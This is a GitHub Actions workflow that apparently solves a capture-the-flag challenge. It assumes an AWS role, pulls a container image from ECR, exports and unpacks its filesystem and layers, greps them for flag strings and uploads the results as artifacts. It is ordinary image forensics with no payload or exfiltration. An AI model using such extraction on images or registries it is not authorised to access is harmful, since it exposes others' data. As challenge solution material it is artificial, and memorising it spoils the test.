name: Find image flag
on: [push]

jobs:
  find-flag:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: find-flag-session

      - name: Login to ECR
        run: |
          aws ecr get-login-password --region ap-east-1 \
            | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com

      - name: Pull image
        run: docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest

      - name: Inspect image labels (troll may appear here)
        run: docker inspect --format '{{json .Config.Labels}}' 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest || true

      - name: Export container filesystem
        run: |
          CID=$(docker create 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest /bin/sh)
          docker export "$CID" -o fs.tar
          mkdir -p exported_fs
          tar -xf fs.tar -C exported_fs
          docker rm "$CID"
          ls -la exported_fs | head -40

      - name: Grep for flags and suspicious files in exported FS
        run: |
          cd exported_fs || exit 0
          echo "=== Grep for flag patterns ==="
          grep -RI --binary-files=without-match -nE 'CTF\{[^}]+\}|FLAG[:= ]|flag|ECTF\{[^}]+\}' . || true
          echo "=== Find likely files ==="
          find . -type f \( -iname "*flag*" -o -iname "*.txt" -o -iname "*.enc" -o -iname "not-flag-yet" -o -iname "output*" \) -print -exec sed -n '1,200p' {} \; 2>/dev/null || true

      - name: Extract layers and search them
        run: |
          docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest -o image.tar
          mkdir -p image_contents layers_extracted
          tar -xf image.tar -C image_contents
          for layer in $(find image_contents -type f -name "layer.tar"); do
            d=$(mktemp -d)
            tar -xf "$layer" -C "$d" || true
            cp -r "$d"/* layers_extracted/ 2>/dev/null || true
          done
          echo "=== Grep layers ==="
          grep -RI --binary-files=without-match -nE 'CTF\{[^}]+\}|FLAG[:= ]|flag|ECTF\{[^}]+\}' layers_extracted || true

      - name: Upload exported filesystem and results
        uses: actions/upload-artifact@v4
        with:
          name: image-export-and-findings
          path: |
            exported_fs/**
            fs.tar
            image.tar
            layers_extracted/**
